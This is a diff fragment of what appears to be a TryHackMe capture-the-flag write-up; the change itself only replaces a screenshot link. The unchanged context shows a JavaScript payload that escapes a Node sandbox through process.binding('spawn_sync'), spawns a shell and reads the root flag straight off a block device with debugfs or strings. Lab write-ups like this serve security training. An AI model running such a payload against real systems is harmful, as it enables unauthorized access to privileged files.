@@ -153,7 +153,8 @@ Read the root flag directly from the block device using `debugfs` or `strings`, 
 > (function(){try{var r=process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','debugfs -R "cat /root/root.txt" /dev/nvme0n1p1 2>&1 || strings /dev/nvme0n1p1 | grep -i thm 2>&1'],stdio:[{type:'pipe',readable:1,writable:0},{type:'pipe',readable:0,writable:1},{type:'pipe',readable:0,writable:1}]});var o='';if(r.output){for(var i=1;i<r.output.length;i++){if(r.output[i])o+=r.output[i].toString();}}return o||JSON.stringify(r);}catch(e){return e.toString();}})()
 ```
 
-<img width="1897" height="536" alt="Screenshot 2026-08-04 101850" src="https://github.com/user-attachments/assets/6b4b18e7-772b-456c-9438-3548b2a9d803" />
+<img width="1897" height="536" alt="Screenshot 2026-08-04 101850" src="https://github.com/user-attachments/assets/5c95f098-296b-4826-bb47-758cd526e531" />
+
 
 
 During the final extraction phase, the TryHackMe lab machine terminated due to a session timeout. Despite the interruption, the core exploitation path was successfully mapped and validated.
